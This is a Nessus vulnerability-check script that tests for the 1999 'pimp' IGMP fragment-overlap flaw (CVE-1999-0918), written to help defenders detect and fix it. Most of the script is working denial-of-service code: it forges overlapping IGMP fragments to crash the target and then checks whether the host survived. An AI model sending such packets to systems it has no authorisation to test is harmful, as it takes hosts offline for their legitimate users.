#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CVE
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10179);
 if(defined_func("script_xref"))script_xref(name:"IAVA", value:"1999-t-0011");
 script_bugtraq_id(514);
 script_version ("$Revision: 1.19 $");
 script_cve_id("CVE-1999-0918");
 
 name["english"] = "pimp";
 name["francais"] = "pimp";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It was possible to crash the remote host
using the 'pimp' attack. This flaw allows
an attacker to make this host crash at will,
thus preventing the legitimate users from
using it.

Solution : filter incoming IGMP traffic

Risk factor : High";

 desc["francais"] = "
Il s'est avéré possible de tuer
la machine distante en utilisant l'attaque
'pimp'. Ce problème permet à des pirates
de tuer cette machine quand bon
leur semble, empechant ainsi les utilisateurs
légitimes de s'en servir.

Solution : filtrez le traffic IGMP entrant

Facteur de risque : Sérieux";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote host via IGMP overlap";
 summary["francais"] = "Tue le systeme distant par overlap IGMP";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 
 script_family(english:family["english"], francais:family["francais"]);
 
 exit(0);
}

#
# The script code starts here
#


ip = forge_ip_packet(ip_v  : 4, ip_id  : 69,   ip_p : IPPROTO_IGMP,
		     ip_hl : 5, ip_ttl : 255,  ip_src : this_host(),
		     ip_tos: 0, ip_sum : 0, ip_len : 1500, ip_off:0);
		    

start_denial();
for(i=0;i<15;i=i+1)
{
 igmp = forge_igmp_packet(ip:ip, type:2, code:31, group:128.1.1.1,
			 data:crap(1500));
 igmp = set_ip_elements(ip:igmp, ip_len:1500, ip_off:IP_MF);
 send_packet(igmp, pcap_active:FALSE);
 
 a = 1480/8;
 
 igmp = set_ip_elements(ip:igmp,ip_off:a|IP_MF);
 send_packet(igmp, pcap_active:FALSE);
 
 a = 5920/8;
 igmp = set_ip_elements(ip:igmp, ip_off:a|IP_MF);
 send_packet(igmp, pcap_active:FALSE);
 
 igmp = set_ip_elements(ip:igmp, ip_len:831, ip_off:7400/8);
 send_packet(igmp, pcap_active:FALSE);
 usleep(500000);
}

alive = end_denial();
if(!alive){
	security_hole(port:0, protocol:"igmp");
	set_kb_item(name:"Host/dead", value:TRUE);
	}
